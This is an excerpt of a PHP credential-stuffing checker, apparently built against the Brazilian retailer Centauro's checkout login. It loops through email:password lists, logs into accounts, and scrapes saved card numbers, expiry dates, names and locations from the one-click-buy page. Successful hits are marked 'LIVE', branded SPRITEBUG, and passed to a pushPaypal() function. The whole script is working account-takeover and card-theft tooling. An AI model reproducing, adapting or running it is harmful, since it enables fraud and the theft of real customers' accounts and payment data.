...
class cURL {
    ...
    function doRequest($method, $url) {
        ...
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Centauro.txt'); //COOKIES  DO NAVEGADOR
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Centauro.txt'); //COOKIES DO NAVEGADOR
        curl_setopt($ch, CURLOPT_REFERER, 'https://checkout.centauro.com.br/slogin?ReturnUrl=/minha-conta/cadastro');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);                 
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'ReturnUrl=%2Fminha-conta%2Fcadastro&Login='.$email.'&Cadastro=false&Cep=&Senha='.$pwd); //POST DO LIVE REQUESST        
...
';
    ...
    foreach ($emails AS $k => $line) {
	 ...
	 //DELETAR COOKIES
if(file_exists(getcwd().'/Centauro.txt')) {
        unlink(getcwd().'/Centauro.txt'); 
    }
	//FIM COOKIES
...
$c = new cURL();
    $d = $c->post("https://checkout.centauro.com.br/slogin"); //POST DA 2 CHAMADA
    $f = new cURL();
    $x = $f->get("https://checkout.centauro.com.br/minha-conta/one-click-buy");//CHAMADA TOKEN
...
if (stristr($d,'Dados pessoais') !== false) {
			$cidade = getStr($d,'"cidade":"','",');
            $estado = getStr($d,'"estado":"','",');
            $sobrenome = getStr($d,'name="sobrenome" id="fisica-sobrenome" type="text" maxlength="20" value="','"');
           /* + + + + ++ + */
           $one = getStr($x,'class="cardNumber">','</td>');
            $date = getStr($x,'<td><span>Validade</span>','</td>');
            
            
            
            /*+++++++++++++++++*/
            $xyz = "<b style=\"color:SteelBlue\">[</b><b style=\"color:DodgerBlue\">SPRITEBUG</b><b style=\"color:SteelBlue\">]</b><b style=\"color:green\">LIVE</b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> |<b style=\"color:Teal\" >$cidade/$estado| $one | $date </b>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
